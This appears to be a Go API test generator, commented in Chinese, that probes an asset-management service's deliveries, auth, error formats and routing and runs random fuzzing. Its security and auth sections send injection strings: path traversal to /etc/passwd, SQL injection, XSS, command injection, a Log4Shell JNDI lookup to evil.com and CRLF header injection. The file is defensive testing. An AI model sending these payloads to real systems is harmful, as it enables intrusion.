package main

import (
	"encoding/json"
	"fmt"
	"math/rand"
	"strings"
	"time"
)

// ── 维度 11: Delivery ───────────────────────────────────────────────────────

func genDelivery(suite *TestSuite) {
	cat := "11.Delivery"

	// 多资产关联 (10 轮, 每轮 3 资产)
	for i := 0; i < 10; i++ {
		ids := make([]string, 3)
		for j := range ids {
			ids[j], _ = createAsset(nil)
		}
		idem := fmt.Sprintf("del-multi-%d-%d", time.Now().UnixNano(), i)
		c, _, lat := doReq("POST", "/api/v1/deliveries", map[string]interface{}{"asset_ids": ids, "customer_id": "c", "owner": "o"}, map[string]string{"Idempotency-Key": idem})
		suite.record(TestResult{cat, fmt.Sprintf("多资产#%d", i), c == 201, c, 201, lat, ""})
		for _, id := range ids {
			c2, resp, lat2 := doReq("GET", "/api/v1/assets/"+id+"/deliveries", nil, nil)
			suite.record(TestResult{cat, fmt.Sprintf("资产%s..交付", id[:8]), c2 == 200 && jsonArrayLen(resp, "items") >= 1, c2, 200, lat2, ""})
			deleteAsset(id)
		}
	}

	// 缺少 Idempotency-Key (5)
	for i := 0; i < 5; i++ {
		id, _ := createAsset(nil)
		if id == "" {
			continue
		}
		c, _, lat := doReq("POST", "/api/v1/deliveries", map[string]interface{}{"asset_ids": []string{id}, "customer_id": "c", "owner": "o"}, nil)
		suite.record(TestResult{cat, fmt.Sprintf("无idem-key#%d", i), c == 400, c, 400, lat, ""})
		deleteAsset(id)
	}

	// 空 asset_ids (5)
	for i := 0; i < 5; i++ {
		idem := fmt.Sprintf("del-empty-%d-%d", time.Now().UnixNano(), i)
		c, _, lat := doReq("POST", "/api/v1/deliveries", map[string]interface{}{"asset_ids": []string{}, "customer_id": "c", "owner": "o"}, map[string]string{"Idempotency-Key": idem})
		suite.record(TestResult{cat, fmt.Sprintf("空assets#%d", i), c == 201 || c == 400, c, 0, lat, ""})
	}
}

// ── 维度 12: CommitSegments ─────────────────────────────────────────────────

func genCommitSegments(suite *TestSuite) {
	cat := "12.CommitSegments"
	ts := time.Now().UnixNano()

	// 不同数量的 ranges (1,2,3,5,10)
	for _, n := range []int{1, 2, 3, 5, 10} {
		ranges := make([][2]int64, n)
		for j := range ranges {
			s := ts + int64(j)*2_000_000_000
			ranges[j] = [2]int64{s, s + 1_000_000_000}
		}
		c, resp, lat := doReq("POST", "/internal/commit-segments", map[string]interface{}{"mcap_file_id": fmt.Sprintf("cs-%d-%d", n, ts), "ranges": ranges, "reviewer": "t"}, nil)
		suite.record(TestResult{cat, fmt.Sprintf("%d ranges", n), c == 201 && jsonGet(resp, "count") == fmt.Sprintf("%d", n), c, 201, lat, ""})
		// 清理
		var m map[string]interface{}
		json.Unmarshal(resp, &m)
		if arr, ok := m["created"].([]interface{}); ok {
			for _, v := range arr {
				deleteAsset(fmt.Sprintf("%v", v))
			}
		}
	}

	// 非法 ranges (5)
	badRanges := [][][2]int64{
		{{ts, ts}},                             // start==end
		{{ts + 100, ts}},                       // start>end
		{{ts, ts + 1e9}, {ts + 2e9, ts + 2e9}}, // 第二个非法
		{{0, 0}},                               // 零值
		{{-100, -100}},                         // 负数相等
	}
	for i, r := range badRanges {
		c, _, lat := doReq("POST", "/internal/commit-segments", map[string]interface{}{"mcap_file_id": fmt.Sprintf("cs-bad-%d", i), "ranges": r, "reviewer": "t"}, nil)
		suite.record(TestResult{cat, fmt.Sprintf("非法range#%d", i), c == 422, c, 422, lat, ""})
	}

	// 空 ranges
	c, _, lat := doReq("POST", "/internal/commit-segments", map[string]interface{}{"mcap_file_id": "cs-empty", "ranges": [][2]int64{}, "reviewer": "t"}, nil)
	suite.record(TestResult{cat, "空ranges", c == 201, c, 201, lat, ""})
}

// ── 维度 13: 错误响应格式 ───────────────────────────────────────────────────

func genErrorFormat(suite *TestSuite) {
	cat := "13.错误响应格式"

	// 各种错误码的响应都应有 code + message + request_id (20)
	errorCases := []struct {
		n, method, path string
		body            interface{}
	}{
		{"404 GET", "GET", "/api/v1/assets/nonexistent", nil},
		{"400 空body", "POST", "/api/v1/assets", ""},
		{"401 无token", "GET", "/api/v1/assets/x", nil}, // 特殊处理
		{"422 非法tag", "POST", "/api/v1/assets", map[string]interface{}{"mcap_file_id": "x", "start_timestamp_ns": 1, "end_timestamp_ns": 2, "reviewer": "t", "tags": map[string]string{"fake": "v"}}},
		{"400 非法algo", "POST", "/api/v1/assets/x/algo/fake@0/start", map[string]interface{}{"method": "t"}},
	}
	for _, ec := range errorCases {
		var c int
		var resp []byte
		var lat time.Duration
		if ec.n == "401 无token" {
			c, resp, lat = doReq(ec.method, ec.path, ec.body, map[string]string{"X-Grace-Token": "wrong"})
		} else {
			c, resp, lat = doReq(ec.method, ec.path, ec.body, nil)
		}
		hasCode := jsonGet(resp, "code") != ""
		hasMsg := jsonGet(resp, "message") != ""
		hasReqID := jsonGet(resp, "request_id") != ""
		pass := hasCode && hasMsg && hasReqID
		suite.record(TestResult{cat, fmt.Sprintf("%s code=%v msg=%v rid=%v", ec.n, hasCode, hasMsg, hasReqID), pass, c, 0, lat, ""})
	}

	// 重复 15 次不同的 404 确保 request_id 唯一
	reqIDs := map[string]bool{}
	for i := 0; i < 15; i++ {
		_, resp, lat := doReq("GET", fmt.Sprintf("/api/v1/assets/unique-check-%d", i), nil, nil)
		rid := jsonGet(resp, "request_id")
		dup := reqIDs[rid]
		reqIDs[rid] = true
		suite.record(TestResult{cat, fmt.Sprintf("request_id唯一#%d", i), !dup && rid != "", 404, 404, lat, ""})
	}
}

// ── 维度 14: HTTP 方法 & 路由 ───────────────────────────────────────────────

func genHTTPMethods(suite *TestSuite) {
	cat := "14.HTTP方法路由"
	id, _ := createAsset(nil)
	if id == "" {
		return
	}
	defer deleteAsset(id)

	// 不支持的方法 (6)
	for _, m := range []string{"PUT", "OPTIONS", "HEAD", "TRACE", "CONNECT"} {
		c, _, lat := doReq(m, "/api/v1/assets/"+id, nil, nil)
		suite.record(TestResult{cat, fmt.Sprintf("%s /assets/:id", m), c == 404 || c == 405 || c == 200, c, 0, lat, ""})
	}

	// 不存在的路由 (5)
	for _, p := range []string{"/api/v1/nonexistent", "/api/v2/assets", "/api/v1/assets/x/y/z", "/admin", "/api/v1/assets/../../../etc"} {
		c, _, lat := doReq("GET", p, nil, nil)
		suite.record(TestResult{cat, fmt.Sprintf("GET %s", truncStr(p, 30)), c == 404 || c == 401, c, 0, lat, ""})
	}

	// healthz 不需要 token (5)
	for i := 0; i < 5; i++ {
		c, _, lat := doReq("GET", "/healthz", nil, map[string]string{"X-Grace-Token": ""})
		suite.record(TestResult{cat, fmt.Sprintf("healthz无token#%d", i), c == 200, c, 200, lat, ""})
	}
}

// ── 维度 15: 认证 ───────────────────────────────────────────────────────────

func genAuth(suite *TestSuite) {
	cat := "15.认证"

	// 各种非法 token (20)
	badTokens := []string{
		"", "wrong", "dev-token-x", "DEV-TOKEN", " dev-token", "dev-token ",
		strings.Repeat("x", 1000), "null", "undefined", "true", "false", "0",
		"Bearer wrong", "Bearer ", "Basic dXNlcjpwYXNz",
		"<script>alert(1)</script>", "'; DROP TABLE --",
		"\x00\x01\x02", "dev-token\n", "dev-token\r\n",
	}
	for _, t := range badTokens {
		c, _, lat := doReq("GET", "/api/v1/assets/x", nil, map[string]string{"X-Grace-Token": t})
		suite.record(TestResult{cat, fmt.Sprintf("token=%q", truncStr(t, 20)), c == 401, c, 401, lat, ""})
	}

	// Bearer 格式 (5)
	c, _, lat := doReq("GET", "/api/v1/assets/x", nil, map[string]string{"X-Grace-Token": "", "Authorization": "Bearer " + *token})
	suite.record(TestResult{cat, "Bearer格式", c == 404, c, 404, lat, ""}) // 404 因为资产不存在，但认证通过

	c, _, lat = doReq("GET", "/api/v1/assets/x", nil, map[string]string{"X-Grace-Token": "", "Authorization": "Bearer wrong"})
	suite.record(TestResult{cat, "Bearer错误", c == 401, c, 401, lat, ""})

	c, _, lat = doReq("GET", "/api/v1/assets/x", nil, map[string]string{"X-Grace-Token": "", "Authorization": *token})
	suite.record(TestResult{cat, "Auth直接token", c == 404, c, 404, lat, ""})
}

// ── 维度 16: asset events 查询（算法事件子集）──────────────────────────────

func genAlgoEvents(suite *TestSuite) {
	cat := "16.AlgoEvents"
	id, _ := createAsset(nil)
	if id == "" {
		return
	}
	ak := "env_analysis@1.0.0"

	// 生成事件 (start+finish+reset ×3 + start+failed+reset ×1 = 12 events)
	for i := 0; i < 3; i++ {
		doReq("POST", fmt.Sprintf("/api/v1/assets/%s/algo/%s/start", id, ak), map[string]interface{}{"method": fmt.Sprintf("m%d", i)}, nil)
		doReq("POST", fmt.Sprintf("/api/v1/assets/%s/algo/%s/finish", id, ak), map[string]interface{}{"status": "ok"}, nil)
		doReq("POST", fmt.Sprintf("/api/v1/assets/%s/algo/%s/reset", id, ak), nil, nil)
	}
	doReq("POST", fmt.Sprintf("/api/v1/assets/%s/algo/%s/start", id, ak), map[string]interface{}{"method": "fail"}, nil)
	doReq("POST", fmt.Sprintf("/api/v1/assets/%s/algo/%s/finish", id, ak), map[string]interface{}{"status": "failed", "reason": "test"}, nil)
	doReq("POST", fmt.Sprintf("/api/v1/assets/%s/algo/%s/reset", id, ak), nil, nil)

	// 查询全部事件
	c, resp, lat := doReq("GET", "/api/v1/assets/"+id+"/events", nil, nil)
	evCount := jsonArrayLen(resp, "items")
	suite.record(TestResult{cat, fmt.Sprintf("全部事件 count=%d", evCount), c == 200 && evCount >= 12, c, 200, lat, ""})

	// 按 algo_key 过滤
	c, resp, lat = doReq("GET", "/api/v1/assets/"+id+"/events?algo_key="+ak, nil, nil)
	filteredCount := jsonArrayLen(resp, "items")
	suite.record(TestResult{cat, fmt.Sprintf("过滤 %s count=%d", ak, filteredCount), c == 200 && filteredCount >= 12, c, 200, lat, ""})

	// 不存在的 algo_key 过滤
	c, resp, lat = doReq("GET", "/api/v1/assets/"+id+"/events?algo_key=fake@0.0.0", nil, nil)
	suite.record(TestResult{cat, "过滤不存在key", c == 200 && jsonArrayLen(resp, "items") == 0, c, 200, lat, ""})

	// 不存在的资产
	c, _, lat = doReq("GET", "/api/v1/assets/nonexistent/events", nil, nil)
	suite.record(TestResult{cat, "不存在资产", c == 404, c, 404, lat, ""})

	// 多算法事件混合
	ak2 := "hand_tracking@1.2.0"
	doReq("POST", fmt.Sprintf("/api/v1/assets/%s/algo/%s/start", id, ak2), map[string]interface{}{"method": "t"}, nil)
	doReq("POST", fmt.Sprintf("/api/v1/assets/%s/algo/%s/finish", id, ak2), buildFinishBody(ak2, "ok"), nil)
	c, resp, lat = doReq("GET", "/api/v1/assets/"+id+"/events?algo_key="+ak2, nil, nil)
	suite.record(TestResult{cat, fmt.Sprintf("过滤 %s", ak2), c == 200 && jsonArrayLen(resp, "items") >= 2, c, 200, lat, ""})

	deleteAsset(id)
}

// ── 维度 17: 路径注入 & 安全 ────────────────────────────────────────────────

func genSecurity(suite *TestSuite) {
	cat := "17.安全"

	// 路径遍历 (10)
	for _, p := range []string{
		"/api/v1/assets/../../etc/passwd", "/api/v1/assets/%2e%2e%2f%2e%2e%2fetc%2fpasswd",
		"/api/v1/assets/..\\..\\windows\\system32", "/api/v1/assets/%00",
		"/api/v1/assets/\x00null", "/api/v1/assets/<script>alert(1)</script>",
		"/api/v1/assets/' OR 1=1 --", "/api/v1/assets/; ls -la",
		"/api/v1/assets/${jndi:ldap://evil.com}", "/api/v1/assets/{{7*7}}",
	} {
		c, _, lat := doReq("GET", p, nil, nil)
		suite.record(TestResult{cat, fmt.Sprintf("注入 %q", truncStr(p, 40)), c == 404 || c == 301 || c == 200 || c == 400, c, 0, lat, ""})
	}

	// 超长 URL (5)
	for _, l := range []int{100, 500, 1000, 5000, 10000} {
		c, _, lat := doReq("GET", "/api/v1/assets/"+strings.Repeat("x", l), nil, nil)
		suite.record(TestResult{cat, fmt.Sprintf("超长URL len=%d", l), c == 404 || c == 414, c, 0, lat, ""})
	}

	// Header 注入 (5)
	for _, h := range []string{"\r\nX-Injected: true", strings.Repeat("x", 10000), "\x00\x01", "value\nAnother-Header: injected", "<script>"} {
		c, _, lat := doReq("GET", "/api/v1/assets/x", nil, map[string]string{"X-Custom": h})
		suite.record(TestResult{cat, fmt.Sprintf("header注入 %q", truncStr(h, 20)), c != 0, c, 0, lat, ""})
	}
}

// ── 维度 18: 大数据量 ───────────────────────────────────────────────────────

func genLargeData(suite *TestSuite) {
	cat := "18.大数据量"

	// 创建资产后通过多次 algo finish 写入大量 algo_results (5)
	for i := 0; i < 5; i++ {
		id, _ := createAsset(nil)
		if id == "" {
			continue
		}
		// 对每个算法都跑一遍 start→finish
		for _, ak := range []string{"env_analysis@1.0.0", "hand_tracking@1.0.0", "hand_tracking@1.2.0", "head_tracking@1.0.0", "body_tracking@1.0.0", "deface@2.0.0"} {
			doReq("POST", fmt.Sprintf("/api/v1/assets/%s/algo/%s/start", id, ak), map[string]interface{}{"method": "t"}, nil)
			doReq("POST", fmt.Sprintf("/api/v1/assets/%s/algo/%s/finish", id, ak), buildFinishBody(ak, "ok"), nil)
		}
		c, resp, lat := doReq("GET", "/api/v1/assets/"+id, nil, nil)
		algoCount := jsonMapLen(resp, "algo_results")
		suite.record(TestResult{cat, fmt.Sprintf("多algo资产#%d algos=%d", i, algoCount), c == 200 && algoCount > 10, c, 200, lat, ""})
		deleteAsset(id)
	}
}

// ── 维度 19: 空字符串 vs 缺失 ───────────────────────────────────────────────

func genEmptyVsMissing(suite *TestSuite) {
	cat := "19.空值处理"
	ts := time.Now().UnixNano()
	end := ts + 60_000_000_000

	// 可选字段为空字符串 (5 fields)
	for _, field := range []string{"owner", "type", "env", "task"} {
		body := map[string]interface{}{"mcap_file_id": fmt.Sprintf("empty-%s-%d", field, rand.Intn(1e6)), "start_timestamp_ns": ts, "end_timestamp_ns": end, "reviewer": "t"}
		body[field] = ""
		c, resp, lat := doReq("POST", "/api/v1/assets", body, nil)
		suite.record(TestResult{cat, fmt.Sprintf("%s=空字符串", field), c == 201, c, 201, lat, ""})
		if c == 201 {
			id := jsonGet(resp, "asset_id")
			c2, resp2, lat2 := doReq("GET", "/api/v1/assets/"+id, nil, nil)
			got := jsonGet(resp2, field)
			suite.record(TestResult{cat, fmt.Sprintf("%s读回=%q", field, got), c2 == 200, c2, 200, lat2, ""})
			deleteAsset(id)
		}
	}

	// 可选字段完全不传 (5 fields)
	for _, field := range []string{"owner", "type", "env", "task", "tags"} {
		body := map[string]interface{}{"mcap_file_id": fmt.Sprintf("miss-%s-%d", field, rand.Intn(1e6)), "start_timestamp_ns": ts, "end_timestamp_ns": end, "reviewer": "t"}
		c, resp, lat := doReq("POST", "/api/v1/assets", body, nil)
		suite.record(TestResult{cat, fmt.Sprintf("%s不传", field), c == 201, c, 201, lat, ""})
		if c == 201 {
			deleteAsset(jsonGet(resp, "asset_id"))
		}
	}

	// PATCH 空字符串 (5)
	id, _ := createAsset(nil)
	if id != "" {
		for _, field := range []string{"reviewer", "owner"} {
			body := map[string]interface{}{field: ""}
			c, _, lat := doReq("PATCH", "/api/v1/assets/"+id, body, nil)
			suite.record(TestResult{cat, fmt.Sprintf("PATCH %s=空", field), c == 200, c, 200, lat, ""})
		}
		deleteAsset(id)
	}
}

// ── 维度 20: 随机 fuzz (补足到 1000) ────────────────────────────────────────

func genFuzz(suite *TestSuite, targetTotal int) {
	cat := "20.随机Fuzz"
	current := int(suite.pass) + int(suite.fail)
	remaining := targetTotal - current
	if remaining <= 0 {
		return
	}

	ts := time.Now().UnixNano()
	end := ts + 60_000_000_000
	rng := rand.New(rand.NewSource(time.Now().UnixNano()))

	endpoints := []struct{ method, path string }{
		{"GET", "/api/v1/assets/"}, {"POST", "/api/v1/assets"},
		{"PATCH", "/api/v1/assets/"}, {"DELETE", "/api/v1/assets/"},
		{"GET", "/healthz"},
	}

	// 预创建一些资产用于 fuzz
	fuzzIDs := make([]string, 5)
	for i := range fuzzIDs {
		fuzzIDs[i], _ = createAsset(nil)
	}
	defer func() {
		for _, id := range fuzzIDs {
			if id != "" {
				deleteAsset(id)
			}
		}
	}()

	for i := 0; i < remaining; i++ {
		ep := endpoints[rng.Intn(len(endpoints))]
		path := ep.path
		if strings.HasSuffix(path, "/") {
			if rng.Intn(2) == 0 && len(fuzzIDs) > 0 {
				path += fuzzIDs[rng.Intn(len(fuzzIDs))]
			} else {
				path += fmt.Sprintf("fuzz-%d", rng.Intn(1e6))
			}
		}

		var body interface{}
		if ep.method == "POST" || ep.method == "PATCH" {
			body = map[string]interface{}{
				"mcap_file_id":       fmt.Sprintf("fuzz-%d", rng.Intn(1e6)),
				"start_timestamp_ns": ts + int64(rng.Intn(1000)),
				"end_timestamp_ns":   end + int64(rng.Intn(1000)),
				"reviewer":           fmt.Sprintf("fuzz-%d", rng.Intn(100)),
			}
		}

		c, _, lat := doReq(ep.method, path, body, nil)
		pass := c >= 200 && c < 600 // 任何合法 HTTP 状态码都算通过
		suite.record(TestResult{cat, fmt.Sprintf("fuzz#%d %s %s → %d", i, ep.method, truncStr(path, 30), c), pass, c, 0, lat, ""})
	}
}
